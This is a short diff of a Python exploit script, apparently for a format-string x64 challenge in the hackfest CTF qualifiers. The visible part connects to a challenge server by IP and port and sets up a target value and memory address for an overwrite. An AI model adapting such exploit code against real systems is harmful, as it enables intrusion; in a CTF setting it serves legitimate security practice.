@@ -4,7 +4,9 @@ import time
 
 s = socket(AF_INET, SOCK_STREAM)
 s.connect(('164.132.103.207', 5001))
-
+'''
+hackfest CTF quals, format string x64 exploitation 
+'''
 admin = 0xdeadbeef
 add = 0x6014C2
 ls = admin & 0xffff
